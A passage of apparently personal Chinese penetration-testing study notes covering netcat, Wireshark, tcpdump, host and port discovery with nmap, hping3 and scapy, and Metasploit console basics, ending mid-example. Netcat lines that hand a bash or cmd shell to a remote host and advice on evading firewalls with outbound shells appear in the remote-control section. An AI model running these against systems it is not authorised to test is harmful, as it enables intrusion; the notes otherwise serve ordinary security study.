<p>B：ls -l | nc -nv 192.168.153.132 3333 #将当前目录下的文件属性列表信息传递给A。</p>
<p><strong>示例2：</strong></p>
<p>A对B当前系统进程信息进行取证并存档</p>
<p>A:nc -l -p 3333&gt;ps.txt #侦听3333端口，并把侦听内容重定向到当前目录的1.txt文件里</p>
<p>B:ps aux | nc -nv 192.168.153.132 -q 1 #将当前系统进程信息进行取证并存档到1.txt中  -q表示自动                                                                        断开nc连接</p>
<p>A:cat ps.txt #查看ps.txt文件内容</p>
<p>远程电子取证信息收集尽量少的去对目标机器进行修改。</p>
<h5 id="NC（传输文件）"><a href="#NC（传输文件）" class="headerlink" title="NC（传输文件）"></a><strong>NC（传输文件）</strong></h5><p><strong>正向文件运输</strong></p>
<p>A：mc -l -p 3333&gt;1.mp4 #侦听端为文件接受端，接受对方3333端口发送的文件并命名为1.mp4</p>
<p>B：nc -nv 192.168.153.132 3333 &lt;1.mp4 -q 1 #文件发送端</p>
<p><strong>反向文件运输</strong></p>
<p>A: nc -lp 3333&lt; 1.mp4 -q 1 #侦听端为文件发送端，将1.mp4这个文件放在3333侦听端口上等待对方接收</p>
<p>B: nc -nv 192.168.0.5 3333&gt; 1.mp4  #文件接收端</p>
<h5 id="NC（传输目录）"><a href="#NC（传输目录）" class="headerlink" title="NC（传输目录）"></a><strong>NC（传输目录）</strong></h5><h5 id="NC（流媒体服务"><a href="#NC（流媒体服务" class="headerlink" title="NC（流媒体服务)"></a><strong>NC（流媒体服务)</strong></h5><p><strong>示例：</strong></p>
<p>A：cat 1.mp4 | nc -l -p 3333  #A端为流媒体输出端，将1.mp4这个文件打开并通过3333端口进行输                                                        出</p>
<p>B：nc -nv 192.168.153.130 | mplayer -vo x11 -cache 3000 #B端为流媒体客户端，将侦听A端3333                    端口，并通过mplayer媒体播放器进行播放，设定缓存为3000K</p>
<h5 id="NC（端口扫描）"><a href="#NC（端口扫描）" class="headerlink" title="NC（端口扫描）"></a><strong>NC（端口扫描）</strong></h5><p><strong>示例：</strong></p>
<p>nc -nvz 192.168.153.130 1-65535 #扫描目标主机TCP 1-65535开放的端口</p>
<p>nc -nvzu 192.168.153.130 1-65535 #扫描目标主机UDP 1-1024开放的端口</p>
<h5 id="NC（远程控制）"><a href="#NC（远程控制）" class="headerlink" title="NC（远程控制）"></a><strong>NC（远程控制）</strong></h5><p>服务器端开启远程控制：</p>
<p>服务器：nc -lp port -c bash#把shell交给过来连接的客户端</p>
<p>客户端：nc -nv ip port </p>
<p>客户端开启远程控制：</p>
<p>服务器端：nc -lp port</p>
<p>客户端：nc -nv IP port -c bash </p>
<p>window上将-c bash 改为-c cmd</p>
<p>注意事项：服务器防火墙一般会限制外网对内网的访问，但是内网对外网的访问限制可能被忽略。</p>
<p>​                    内网对外网的访问限制：将DNS服务器单独隔离出来，只开放53端口开放侦听外网，</p>
<p>​                    主动在客户端开启一个端口，并在服务器上侦听该端口，且把shell交给客户端。这种方式不容易被防火墙拦截。</p>
<h5 id="NC的缺陷"><a href="#NC的缺陷" class="headerlink" title="NC的缺陷"></a><strong>NC的缺陷</strong></h5><p>缺乏数据加密和身份认证的能力</p>
<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a><strong>NCAT</strong></h5><p>nmap工具包中的ncat，设计用于弥补NC的缺陷。</p>
<p>nc版本太多，参数各不相同，使用起来有困难。</p>
<p>Ubantu版本没有-c，需要用临时文件去转换bash</p>
<p>遇到问题查看man命令手册（系统自带软件）</p>
<p>服务端开启端口：ncat -c bash –allow IP(指定可连接的客户端IP）-vnl port –ssl（防止嗅探者查看到明文信息）</p>
<p>客户端连接：ncat -nv IP port  –ssl    互相交换指纹是一对一连接，保证安全。</p>
<h4 id="二、WIRESHARK"><a href="#二、WIRESHARK" class="headerlink" title="二、WIRESHARK"></a>二、WIRESHARK</h4><p><strong>常用功能</strong></p>
<ul>
<li>抓包嗅探协议分析</li>
<li>抓包引擎</li>
<li>Libpcap9–Linux</li>
<li>winpcap10-windows</li>
</ul>
<p><strong>基本使用方法：</strong></p>
<p>1、终端输入wireshark，启动</p>
<p> 2、选择要抓包的网卡。</p>
<p> 3、打开捕获选项，勾选混杂模式（只抓捕本地信息（网卡绑定的ip地址信息），如果不选择捕获模式则无法获取广播（当前网络中的所有信息）信息）。</p>
<p>4、选择捕获过滤器,可以选择要抓包的内容，如ip地址 格式 host ip地址或者其他协议。</p>
<p> 5、停止抓包后保存内容，尽量使用pcap格式。兼容性较好。</p>
<p> 6、通过分析-显示过滤器对抓包结果进行过滤</p>
<p><strong>数据包的分层结构</strong></p>
<ul>
<li>Arp</li>
<li>lcmp</li>
<li>Tcp三次握手</li>
</ul>
<p>1.源向目标发送syn包（确认连接）</p>
<p>2.目标向源发送syn、ack（回应并向源确认）</p>
<p>3.源向目标发送ack包（回应目标发送的syn）</p>
<ul>
<li>Udp</li>
<li>Dns</li>
<li>http</li>
<li>ftp</li>
</ul>
<p><strong>数据流</strong></p>
<ul>
<li>TCP流</li>
<li>UDP流</li>
<li>SSL流</li>
<li>HTTP流</li>
</ul>
<h4 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h4><h5 id="tcpdump——抓包"><a href="#tcpdump——抓包" class="headerlink" title="tcpdump——抓包"></a>tcpdump——抓包</h5><p>​       wireshark是图形化工具，在服务器等没有图形化界面的设备上无法使用，此时tcpdump命令行工具可以代替</p>
<pre><code>tcpdump -i eth0 -s 0 -w a.cap/b.pcap</code></pre><p>-i 指定抓包接口，-s 指定抓包大小，0为抓取整个包，不指定则默认抓取64字节。-w 将抓到的包保存到某个文件，不指定则实时显示</p>
<pre><code>tcpdump -r a.cap/b.cap</code></pre><p>-r read读取</p>
<pre><code>tcpdump -A -r a.cap/b.cap</code></pre><p>-A 使用ascii码表转码显示，不要加在-r后面，不然会报错 -X 使用16进制显示</p>
<h5 id="tcpdump——抓包筛选器"><a href="#tcpdump——抓包筛选器" class="headerlink" title="tcpdump——抓包筛选器"></a>tcpdump——抓包筛选器</h5><pre><code>tcpdump -i eth0 port 22</code></pre><p>抓以太网0上22端口的包。</p>
<pre><code>tcpdump -i eth0 tcp port 22</code></pre><p>抓以太网0上22端口的TCP包。 curl -v URL</p>
<h5 id="tcpdump——显示筛选器"><a href="#tcpdump——显示筛选器" class="headerlink" title="tcpdump——显示筛选器"></a>tcpdump——显示筛选器</h5><pre><code>tcpdump -n -r http.cap | awk &#39;{print $3}&#39; | sort -u</code></pre><p>-n 不对IP进行域名解析  AWK 默认用空格做分割 -u unique去重</p>
<pre><code>tcpdump -n src host IP -r file.cap/file.pcap</code></pre><p>src host IP 指定来源IP，src–&gt;source</p>
<pre><code>tcpdump -n dst host IP -r file.cap/file.pcap</code></pre><p>dst destination，指定目标IP</p>
<pre><code>tcpdump -n udp port 53  -r file.cap/file.pcap</code></pre><p>udp 指定显示的协议  port 53 指定端口</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>渗透测试——主动信息收集</title>
    <url>/2020/03/12/shen-tou-ce-shi-zhu-dong-xin-xi-shou-ji/</url>
    <content><![CDATA[<h3 id="主动信息收集部分"><a href="#主动信息收集部分" class="headerlink" title="主动信息收集部分"></a>主动信息收集部分</h3><h4 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h4><ul>
<li><p>直接与目标主机交互</p>
</li>
<li><p>无法避免留下发文的痕迹；</p>
</li>
<li><p>使用受控的第三方电脑进行探测；</p>
</li>
<li><p>使用代理或者已经被控制的主机</p>
</li>
<li><p>做好被封杀的准备</p>
</li>
<li><p>使用噪音迷惑目标，淹没真实的探测流量</p>
</li>
<li><p>扫描-发送不同的探测，根据返回结果判断目标状态</p>
</li>
</ul>
<h4 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h4><ul>
<li>识别活着的主机</li>
<li>潜在的被攻击目标</li>
<li>输出一个IP地址列表</li>
<li>网络2、3、4层发现</li>
</ul>
<p>包括ARP、IPv4、IPv6、ICMP、IPSec、TCP、UDP</p>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><p>优点：扫描速度快，可靠</p>
<p>缺点：不可路由</p>
<h5 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h5><ul>
<li><p>抓包</p>
</li>
<li><p>arping 1.1.1.1 -c 1</p>
</li>
<li><p>arping 1.1.1.1 -d</p>
<p>发现重复响应，不同mac地址拥有相同的IP时，退出返回1</p>
<p> arp地址欺骗：在你的网络里有另外一个IP地址，声称自己是网关IP，发给网关的数据包就会发给欺骗的主机，该主机的所有者就可以在其机器上抓包，实现中间人攻击，嗅探甚至修改通过该主机传输的数据包，窃取密码，篡改数据，实现一些恶意攻击。</p>
</li>
<li><p>arping -c 1.1.1.1 grep “bytes from”|cut -d “ “ -f 5|cut -d “(“ -f 2 |cut -d “)” -f 1</p>
</li>
<li><p>脚本：</p>
<p>arping1.sh eth0&gt;addrs</p>
</li>
</ul>
<p>​       arping2.sh addrs    </p>
<h5 id="nmap二层发现"><a href="#nmap二层发现" class="headerlink" title="nmap二层发现"></a>nmap二层发现</h5><ul>
<li>nmap 1.1.1.1-254 -sn</li>
<li>nmap 1.1.1.1/24 -sn</li>
</ul>
<p>​          -sn ping扫描，禁用端口扫描</p>
<ul>
<li>​    nmap -iL iplist.txt -sn （扫描文件内IP，类似arping2.sh功能）</li>
</ul>
<h5 id="Netdiscover–二层发现"><a href="#Netdiscover–二层发现" class="headerlink" title="Netdiscover–二层发现"></a>Netdiscover–二层发现</h5><ol>
<li>专用于二层发现</li>
<li>可用于无线和交换网络环境</li>
<li>主动和被动探测</li>
</ol>
<p><strong>主动</strong></p>
<p>netdiscover -i eth0 -r 192.168.1/24</p>
<p>netdiscover -i iplist.txt</p>
<p><strong>被动</strong></p>
<p>netdiscover -p  #将本地网卡赋值为混杂模式，非本网卡的数据包也会被侦听到</p>
<p>主动arp容易触发报警</p>
<h5 id="Scapy-二层发现"><a href="#Scapy-二层发现" class="headerlink" title="Scapy-二层发现"></a>Scapy-二层发现</h5><p>•作为Python库进行调用</p>
<p>•也可作为单独的工具使用</p>
<p>•抓包、分析、创建、修改、注入网络流量</p>
<p>• apt-get install python-gnuplot #安装python-gnuplot组件</p>
<p>• Scapy  #启动Scapy</p>
<h4 id="发现-三层发现"><a href="#发现-三层发现" class="headerlink" title="发现-三层发现"></a>发现-三层发现</h4><p>IP,icmp协议  网络控制管理层</p>
<p>路径发现，主机网络通断的诊断</p>
<p>优点：可路由，速度快。</p>
<p>缺点：速度比二层慢，经常被边界防火墙过滤。</p>
<h5 id="ping-icmp"><a href="#ping-icmp" class="headerlink" title="ping(icmp)"></a>ping(icmp)</h5><ul>
<li>ping 192.168.1.1 -c 2（设置发包的数量）</li>
<li>路由追踪：traceroute <a href="http://www.sina.com" target="_blank" rel="noopener">www.sina.com</a></li>
<li>ping -R 192.168.1.1</li>
<li>ping 192.168.1.1 -c 1 | grep “bytes from”|cut -d “” -f 4 | cut -d “.” -f 1</li>
</ul>
<h5 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h5><p>OSI多层堆叠手工声称ICMP包-IP/icmp</p>
<ul>
<li>i=Ip()</li>
<li>i.dst=”192.168.1.1”（目标IP地址）</li>
<li>p=ICMP()</li>
<li>a=str(i/p)</li>
<li>a.display()</li>
</ul>
<h5 id="Nmap——三层发现"><a href="#Nmap——三层发现" class="headerlink" title="Nmap——三层发现"></a>Nmap——三层发现</h5><p>nmap -sn 192.168.1/24  (-sn在同一网段，用arp，不同网段，用ICMP)</p>
<h5 id="fping-——三层发现"><a href="#fping-——三层发现" class="headerlink" title="fping ——三层发现"></a>fping ——三层发现</h5><ul>
<li>fping 1.1.1.1 -c 1 （会显示包大小、响应时间、丢包率）</li>
<li>fping -g 1.1.1.1  1.1.1.2(起始参数 结束参数)</li>
<li>fping -g 1.1.1.0/24</li>
<li>fping -f iplist.txt</li>
</ul>
<h5 id="hping——三层发现"><a href="#hping——三层发现" class="headerlink" title="hping——三层发现"></a>hping——三层发现</h5><ul>
<li>Hping(功能强大)</li>
<li>能够发送几乎任意TCP/IP包</li>
<li>功能强大但每次只能扫描一个目标</li>
<li>hping3 192.168.1.1 –icmp -c 5(发5个ping包)</li>
<li>for addr in $(seq 1 254); do hping3 192.168.1.$addr –icmp -c 5 &gt;&gt; handle.txt &amp; done</li>
</ul>
<h4 id="发现——四层扫描"><a href="#发现——四层扫描" class="headerlink" title="发现——四层扫描"></a>发现——四层扫描</h4><p>优点</p>
<ul>
<li>可路由且结果可靠</li>
<li>不太可能被防火墙过滤</li>
<li>甚至可以发现所有端口都被过滤的主机</li>
</ul>
<p>缺点</p>
<ul>
<li>基于状态过滤的防火墙可能过滤扫描</li>
<li>全端口扫描速度慢</li>
</ul>
<p>TCP(三次握手)</p>
<p>未经请求的ACK-RST（非正常通信：目标在线）</p>
<p>SYN-SYN/ACK、RST(正常通信：目标在线)</p>
<p>UDP</p>
<p>目标IP不在线，无响应，目标IP在线、探测的端口也是开放状态，目标主机不会回复；只有一种情况可以探测：我发向目标IP一个没有开放的端口，对方回复一个ICNP端口不可达、一去不复返。</p>
<p>ACK—Tcp  Port—-RST(如果返回rst则在线)</p>
<p>scapy：</p>
<p>\1. i=IP()</p>
<p>\2. t=TCP()</p>
<p>3.r=(i/t)</p>
<p>4.r[tcp].flags=’A’（表示发ack包）</p>
<p>r[IP].dst=”1.1.1.1”</p>
<p>a=sr1(r)</p>
<p>a.display()(查看返回的包)</p>
<p>a=sr1(IP(dst=”1.1.1.1”)/TCP(dport=80,flags=’A’),timeout=1)</p>
<p>UDP—–UDP Port—–icmp</p>
<p>1.u=UDP()</p>
<p>2.u.deport=33333</p>
<p>3.r=(i/u)</p>
<p>4.a=sr1(r.timeout=1,verbose=1)</p>
<p>5.a.display()</p>
<p>6.a=sr1(r)</p>
<p>port-unreachable(目标端口不可达)</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h5><p>str1(dst=”192.168.1.1”/TCP(dport=80),timeout=1,verbose=1)</p>
<p>操作系统莫名接受一个syn/ack包，会自动给目标服务器回复一个rst包</p>
<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>nmap -sS 1.1.1.1 -p 80,21,25,443</p>
<p>可以不加-sS 默认是-sS</p>
<p>-p 1-100 扫描1到100</p>
<p>-p 全扫描</p>
<p>–open 只显示open的端口</p>
<p>nmap -sS -iL test.txt -p 80</p>
<h5 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h5><p>hping3 1.1.1.1 –scan 80,21,25 -S</p>
<p>hping3 1.1.1.1 –scan 0-65535 -S</p>
<p>hping3 -c 10 -S –spoof 192.168.1.140 -p ++1 192.168.1.1</p>
<p>-c 发包数量 –spoof欺骗伪造成另一个IP</p>
<p>++1端口号每次+1</p>
<h5 id="全连接端口扫描"><a href="#全连接端口扫描" class="headerlink" title="全连接端口扫描"></a>全连接端口扫描</h5><p>全连接对scapy比较困难</p>
<p>特殊情况下隐蔽扫描无法准确检测</p>
<p>把操作系统返回的rst包被iptable过滤掉,建立完整的连接</p>
<p>iptables -A OUTPUT -p tcp –tcp-flags RST RST -d 192.168.1.134 -j DROP</p>
<p>-d 目标ip</p>
<p>scapy脚本</p>
<p><strong>nmap:</strong></p>
<p>nmap -sT 1.1.1.1 -p 80,21</p>
<p>nmap -sT 1.1.1.1 -p 80-2000</p>
<p>nmap -sT -iL test.txt -p 80</p>
<p>不加-p 默认1000个常用端口</p>
<p><strong>dmitry:</strong></p>
<p>功能简单,但使用简便,默认150个做常用端口</p>
<p>dmitry -p 1.1.1.1  //tcp扫描</p>
<p>dmitry -p 1.1.1.1 -o output</p>
<p>-o 保存到文件</p>
<p><strong>nc:</strong></p>
<p>nc -nv -w l -z 1.1.1.1 1-100</p>
<p>-w 超时时间</p>
<h4 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h4><ul>
<li><p>识别开发端口上运行的应用</p>
</li>
<li><p>识别目标操作系统</p>
</li>
<li><p>提高攻击效率</p>
<ul>
<li>Banner捕获</li>
<li>服务识别</li>
<li>操作系统识别</li>
<li>SNMP分析</li>
<li>防火墙识别</li>
</ul>
<h5 id="服务扫描——banner"><a href="#服务扫描——banner" class="headerlink" title="服务扫描——banner"></a>服务扫描——banner</h5><ul>
<li>软件开发商</li>
<li>软件名称</li>
<li>服务类型</li>
<li>版本号</li>
<li>直接发现已知的漏洞和弱点</li>
</ul>
</li>
<li><p>连接建立后直接获取banner</p>
</li>
<li><p>另类服务识别方法</p>
<ul>
<li>特征行为和响应字段</li>
<li>不同的响应可用于识别底层操作系统</li>
</ul>
<p><strong>Python socket</strong></p>
<ul>
<li><p>Socket模块用于连接网络服务</p>
<pre><code>import socket
bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bangrab.connect((&quot;1.1.1.1&quot;,21))
bangrab.recv(4096)
bangrab.close()
exit()</code></pre></li>
<li><p>Banner不允许抓取，recv函数无返回将挂起！</p>
</li>
</ul>
<p><strong>dmitry</strong></p>
<ul>
<li><code>dmitry -p 192.168.153.131</code></li>
<li><code>dmitry -pb 192.168.153.131</code></li>
</ul>
<p><strong>nmap</strong></p>
<p><code>nmap -sT 192.168.153.131 -p 22 --script=banner.nse</code></p>
<p><strong>amap</strong></p>
<ul>
<li><code>amap -B 192.168.153.131 21</code></li>
<li><code>amap -B 192.168.153.131 1-65535</code></li>
<li><code>amap -B  192.168.153.131|grep on</code></li>
</ul>
<p>banner信息抓取能力有限</p>
<p>nmap响应特征分析识别服务</p>
<ul>
<li>发送系列复杂的探测</li>
<li>依据响应特征signature</li>
<li><code>nc  -nv 1.1.1.1 80</code></li>
<li><code>nmap 1.1.1.1 -p 80 -sV</code></li>
</ul>
<h5 id="服务扫描——SNMP"><a href="#服务扫描——SNMP" class="headerlink" title="服务扫描——SNMP"></a>服务扫描——SNMP</h5><ul>
<li><p>简单网络管理协议</p>
</li>
<li><p>Community strings</p>
</li>
<li><p>信息查询或重新配置</p>
<p>识别和绕过防火墙筛选</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Mestasploit基本使用学习</title>
    <url>/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</url>
    <content><![CDATA[<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
</ul>
<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
</li>
<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
</li>
<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li><p>开发活跃版本更新频繁</p>
<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
<li><p>Metasploit 默认集成 kali linux 中</p>
</li>
<li><p>使用 postgresql 数据库存储数据</p>
<ul>
<li>早期版本需要先启动数据库再启动 msf</li>
</ul>
<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
</li>
</ul>
<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的的 API 接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin 插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
<li>模块<ul>
<li>/usr/share/metasploit-framework/modules/</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
</ul>
</li>
<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
<li>shellcode 或系统命令</li>
<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
<li>stages：利用 stager 建立的连接下载的后续payload</li>
<li>stager、stages 都有多种类型，适用于不同场景</li>
<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
<li>Nops：提高 paylaod 稳定性及维持大小</li>
</ul>
</li>
</ul>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
<li>使用前先升级：<strong>msfupdate</strong></li>
<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
<li>msfconsole 使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部 msf 功能</li>
<li>控制台命令支持 TAB 自动补全</li>
<li>支持外部命令的执行（系统命令等）</li>
</ul>
</li>
<li>点击鼠标启动</li>
</ul>
<pre><code>通用选项:
    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;

数据库选项:
    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
    -n, --no-database                禁用数据库支持
    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件

框架选项:
    -c FILE                          加载指定的配置文件
    -v, -V, --version                显示版本

模块选项:
        --defer-module-loads         除非明确询问，否则推迟模块加载
    -m, --module-path DIRECTORY      加载一个额外的模块路径

控制台选项:
    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
    -H, --history-file FILE          将命令历史记录保存到指定的文件
    -L, --real-readline              使用系统Readline库而不是RbReadline
    -o, --output FILE                输出到指定的文件
    -p, --plugin PLUGIN              在启动时加载插件
    -q, --quiet                      不要在启动时显示 banner 信息
    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
    -h, --help                       显示此消息</code></pre><ul>
<li>进入 msfconsole，查看帮助信息</li>
</ul>
<pre><code>root@kali:~# msfconsole
msf &gt; help

核心命令
=============

    命令            描述
    -------       -----------
    ?             帮助菜单
    banner        显示一个很棒的metasploit横幅
    cd            更改当前的工作目录
    color         切换高亮显示颜色
    connect       连接与主机通信
    exit          退出退出控制台
    get           获取特定于上下文的变量的值
    getg          获取全局变量的值
    grep          Grep另一个命令的输出
    help          帮助菜单
    history       历史显示命令历史
    irb           进入irb脚本模式
    load          加载一个框架插件
    quit          退出控制台
    route         路由通过会话路由流量
    save          保存保存活动的数据存储
    sessions      会话转储会话列表并显示有关会话的信息
    set           将特定于上下文的变量设置为一个值
    setg          将全局变量设置为一个值
    sleep         睡眠在指定的秒数内不执行任何操作
    spool         将控制台输出写入文件以及屏幕
    threads       线程查看和操作后台线程
    unload        卸载卸载框架插件
    unset         取消设置取消设置一个或多个特定于上下文的变量
    unsetg        取消设置取消设置一个或多个全局变量
    version       版本显示框架和控制台库版本号


模块命令
===============

    命令            描述
    -------       -----------
    advanced      高级显示一个或多个模块的高级选项
    back          返回从当前上下文返回
    edit          编辑使用首选编辑器编辑当前模块或文件
    info          显示有关一个或多个模块的信息
    loadpath      加载路径搜索并加载路径中的模块
    options       选项显示全局选项或一个或多个模块
    popm          将最新的模块从堆栈弹出并使其处于活动状态
    previous      将之前加载的模块设置为当前模块
    pushm         将活动或模块列表推入模块堆栈
    reload_all    重新加载所有定义的模块路径中的所有模块
    reload_lib    从指定路径加载库文件
    search        搜索搜索模块名称和说明
    show          显示给定类型的模块或所有模块
    use           使用按名称选择模块


工作命令
============

    命令            描述
    -------       -----------
    handler       处理程序作为作业启动负载处理程序
    jobs          作业显示和管理作业
    kill          杀死一份工作
    rename_job    重命名作业


资源脚本命令
========================

    命令            描述
    -------       -----------
    makerc        保存从开始到文件输入的命令
    resource      运行存储在文件中的命令


数据库后端命令
=========================

    命令                描述
    -------           -----------
    db_connect        连接到现有的数据库
    db_disconnect     断开当前数据库实例
    db_export         导出包含数据库内容的文件
    db_import         导入扫描结果文件（文件类型将被自动检测）
    db_nmap           执行nmap并自动记录输出
    db_rebuild_cache  重建数据库存储的模块缓存
    db_status         显示当前的数据库状态
    hosts             列出数据库中的所有主机
    loot              列出数据库中的所有战利品
    notes             列出数据库中的所有注释
    services          列出数据库中的所有服务
    vulns             列出数据库中的所有漏洞
    workspace         在数据库工作区之间切换


凭证后端命令
============================

    命令            描述
    -------       -----------
    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
<li>msf &gt; help show</li>
</ul>
<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
<li>msf &gt; help search</li>
</ul>
<pre><code>用法: search [keywords]

Keywords:
  app       :  客户端或服务器攻击的模块
  author    :  本作者编写的模块
  bid       :  具有匹配的Bugtraq ID的模块
  cve       :  具有匹配CVE ID的模块
  edb       :  具有匹配的Exploit-DB ID的模块
  name      :  具有匹配描述性名称的模块
  platform  :  影响这个平台的模块
  ref       :  具有匹配参考的模块
  type      :  特定类型的模块（exploit，auxiliary或post）

msf &gt; search ms08-067
msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
<li>模块内命令</li>
</ul>
<pre><code>msf &gt; search ms09_001_write
msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info

[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets



msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
    用法：编辑[file / to / edit.rb]
    使用编辑当前活动模块或本地文件。
    如果指定了文件路径，它将在编辑后自动重新加载。
    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
<li>数据库操作</li>
</ul>
<pre><code>msf &gt; help db_connect 
    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
    [*]       OR: db_connect -y [path/to/database.yml]
    [*] Examples:
    [*]        db_connect user@metasploit3
    [*]        db_connect user:pass@192.168.0.2/metasploit3
    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3

msf &gt; help db_import
    Usage: db_import &lt;filename&gt; [file2...]
    Filenames can be globs like *.xml, or **/*.xml which will search recursively

msf &gt; help db_export
    Usage:
    db_export -f &lt;format&gt; [filename]
    Format can be one of: xml, pwdump</code></pre><ul>
<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
</ul>
<pre><code>活动的会话操作和交互。

选项:

    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
    -K        终止所有会话
    -S &lt;opt&gt;  行搜索过滤器。
    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
    -h        帮助横幅
    -i &lt;opt&gt;  与提供的会话ID进行交互
    -k &lt;opt&gt;  按会话ID和/或范围终止会话
    -l        列出所有活动会话
    -n &lt;opt&gt;  按ID命名或重命名会话
    -q        静音模式
    -r        重置用-i或全部给定的会话的环形缓冲区
    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
    -t &lt;opt&gt;  设置响应超时（默认值：15）
    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
    -v        以详细模式列出会话
    -x        在会话表中显示扩展信息

许多选项允许使用逗号和破折号指定会话范围。
例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
<pre><code>root@kali:~# cat ms08067.rb 
